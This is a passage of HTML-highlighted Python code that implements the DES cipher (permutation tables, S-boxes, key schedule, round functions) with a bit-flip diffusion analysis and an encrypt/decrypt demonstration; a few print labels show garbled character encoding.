class="built_in">ord</span>(i))[<span class="number">2</span>:],<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        self.p_box_left = list_from_zero([<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>])</span><br><span class="line">        self.p_box_right = list_from_zero([<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.key_left = [self.key[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p_box_left]</span><br><span class="line">        self.key_right = [self.key[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p_box_right]</span><br><span class="line"></span><br><span class="line">        self.s=[[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">                ,[<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">                ,[<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line">                ,[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">                ,[<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">                ,[<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">                ,[<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">                ,[<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line">        self.p = list_from_zero([<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,  </span><br><span class="line">                                <span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,  </span><br><span class="line">                                <span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,  </span><br><span class="line">                                <span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">        self.p_rev = list_from_zero([<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                                    <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                                    <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                                    <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>])</span><br><span class="line"></span><br><span class="line">        self.roll_dict = &#123;<span class="number">1</span>:<span class="number">1</span>,<span class="number">2</span>:<span class="number">1</span>,<span class="number">3</span>:<span class="number">2</span>,<span class="number">4</span>:<span class="number">2</span>,<span class="number">5</span>:<span class="number">2</span>,<span class="number">6</span>:<span class="number">2</span>,<span class="number">7</span>:<span class="number">2</span>,<span class="number">8</span>:<span class="number">2</span>,<span class="number">9</span>:<span class="number">1</span>,<span class="number">10</span>:<span class="number">2</span>,<span class="number">11</span>:<span class="number">2</span>,<span class="number">12</span>:<span class="number">2</span>,<span class="number">13</span>:<span class="number">2</span>,<span class="number">14</span>:<span class="number">2</span>,<span class="number">15</span>:<span class="number">2</span>,<span class="number">16</span>:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.yasuo = list_from_zero([<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span></span><br><span class="line">                                ,<span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span></span><br><span class="line">                                ,<span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span></span><br><span class="line">                                ,<span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">        self.p_box = list_from_zero([<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>,  <span class="number">25</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">IP_change</span>(<span class="params">self,plain</span>):</span><br><span class="line">        new_plain = [plain[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p]</span><br><span class="line">        <span class="keyword">return</span> new_plain</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">IP_rev</span>(<span class="params">self,cypher</span>):</span><br><span class="line">        new_cypher = [cypher[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p_rev]</span><br><span class="line">        <span class="keyword">return</span> new_cypher</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">key_gen</span>(<span class="params">self,times</span>):</span><br><span class="line">        roll_time = self.roll_dict[times]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(roll_time):</span><br><span class="line">            temp = self.key_left.pop(<span class="number">0</span>)</span><br><span class="line">            self.key_left.append(temp)</span><br><span class="line"></span><br><span class="line">            temp = self.key_right.pop(<span class="number">0</span>)</span><br><span class="line">            self.key_right.append(temp)</span><br><span class="line"></span><br><span class="line">        all_list = self.key_left+self.key_right</span><br><span class="line">        final = [all_list[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.yasuo]</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">key_gen_decode</span>(<span class="params">self,times</span>):  </span><br><span class="line">        roll_time = self.roll_dict[<span class="number">17</span>-times]</span><br><span class="line"></span><br><span class="line">        all_list = self.key_left+self.key_right</span><br><span class="line">        final = [all_list[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.yasuo]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(roll_time):</span><br><span class="line">            temp = self.key_left.pop(-<span class="number">1</span>)</span><br><span class="line">            self.key_left.insert(<span class="number">0</span>,temp)</span><br><span class="line"></span><br><span class="line">            temp = self.key_right.pop(-<span class="number">1</span>)</span><br><span class="line">            self.key_right.insert(<span class="number">0</span>,temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">E_box</span>(<span class="params">self,part</span>):</span><br><span class="line">        first_list = [part[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        second_list = []</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(first_list)):</span><br><span class="line">            temp = first_list[each][:]</span><br><span class="line">            temp.insert(<span class="number">0</span>,first_list[(each-<span class="number">1</span>)%<span class="number">8</span>][-<span class="number">1</span>])</span><br><span class="line">            temp.append(first_list[(each+<span class="number">1</span>)%<span class="number">8</span>][<span class="number">0</span>])</span><br><span class="line">            second_list += temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> second_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">S_box</span>(<span class="params">self,part</span>):</span><br><span class="line">        group = [part[<span class="number">6</span>*i:<span class="number">6</span>*i+<span class="number">6</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        final = []</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> group:</span><br><span class="line">            row = each[<span class="number">0</span>]*<span class="number">2</span>+each[<span class="number">5</span>]</span><br><span class="line">            col = each[<span class="number">4</span>]+each[<span class="number">3</span>]*<span class="number">2</span>+each[<span class="number">2</span>]*<span class="number">4</span>+each[<span class="number">1</span>]*<span class="number">8</span></span><br><span class="line">            temp = padding(<span class="built_in">bin</span>(self.s[i][row*<span class="number">16</span>+col])[<span class="number">2</span>:],<span class="number">4</span>)</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> one <span class="keyword">in</span> temp:</span><br><span class="line">                final.append(<span class="built_in">int</span>(one))</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">P_box</span>(<span class="params">self,part</span>):</span><br><span class="line">        final = [part[i] <span class="keyword">for</span> i <span class="keyword">in</span> self.p_box]</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_64bits</span>(<span class="params">self,plain</span>):</span><br><span class="line">        ipchange = self.IP_change(plain)</span><br><span class="line">        L = ipchange[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        R = ipchange[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            extend = self.E_box(L[:])</span><br><span class="line">            key = self.key_gen_decode(i+<span class="number">1</span>)</span><br><span class="line">            after_xor = xor(extend,key)</span><br><span class="line">            after_s = self.S_box(after_xor)</span><br><span class="line">            after_p = self.P_box(after_s)</span><br><span class="line">            final = xor(R,after_p)</span><br><span class="line">            R=L[:]</span><br><span class="line">            L = final[:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> self.IP_rev(L+R)])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode_64bits</span>(<span class="params">self,cypher</span>):</span><br><span class="line">        ipchange = self.IP_change(cypher)</span><br><span class="line">        L = ipchange[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        R = ipchange[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            temp = L[:]</span><br><span class="line">            L = R[:]</span><br><span class="line">            extend = self.E_box(R)</span><br><span class="line">            key = self.key_gen(i+<span class="number">1</span>)</span><br><span class="line">            after_xor = xor(extend,key)</span><br><span class="line">            after_s = self.S_box(after_xor)</span><br><span class="line">            after_p = self.P_box(after_s)</span><br><span class="line">            final = xor(temp,after_p)</span><br><span class="line">            R = final[:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> self.IP_rev(L+R)])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyse</span>():</span><br><span class="line">    a=DES(<span class="string">&#x27;DeS_KeY!&#x27;</span>)</span><br><span class="line">    str1=<span class="string">&#x27;1000100101000100001101001000101110000101000000010001011100110000&#x27;</span></span><br><span class="line">    <span class="comment"># print(a.decode_64bits(&#x27;1&#x27;*64))</span></span><br><span class="line">    <span class="comment"># 1000100101000100001101001000101110000101000000010001011100110000</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        new = <span class="built_in">list</span>(str1[:])</span><br><span class="line">        <span class="keyword">if</span> new[each]==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            new[each]=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">            new=<span class="string">&#x27;&#x27;</span>.join(new)</span><br><span class="line">            res = a.decode_64bits(new)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ç¬¬&quot;</span>+<span class="built_in">str</span>(each+<span class="number">1</span>)+<span class="string">&quot;ä½æ˜æ–‡æ”¹å˜äº†å¯†æ–‡çš„:ç¬¬&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> sec <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                <span class="keyword">if</span> res[sec]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>(sec+<span class="number">1</span>),end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ”¹å˜&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new[each]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">            new=<span class="string">&#x27;&#x27;</span>.join(new)</span><br><span class="line">            res = a.decode_64bits(new)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ç¬¬&quot;</span>+<span class="built_in">str</span>(each+<span class="number">1</span>)+<span class="string">&quot;ä½æ˜æ–‡æ”¹å˜äº†å¯†æ–‡çš„:ç¬¬&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> sec <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                <span class="keyword">if</span> res[sec]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>(sec+<span class="number">1</span>),end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ”¹å˜&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#analyse()</span></span><br><span class="line">    a=DES(<span class="string">&#x27;DeS_KeY!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;plain:&quot;</span>,<span class="string">&#x27;1101&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">    temp = a.encode_64bits(<span class="string">&#x27;1101&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cypher:&quot;</span>,temp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;decode&quot;</span>,a.decode_64bits(temp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#plain: 1101110111011101110111011101110111011101110111011101110111011101</span></span><br><span class="line"><span class="comment">#cypher: 0000001010110100101011010011011001100010110001101100000010101011</span></span><br><span class="line"><span class="comment">#decode 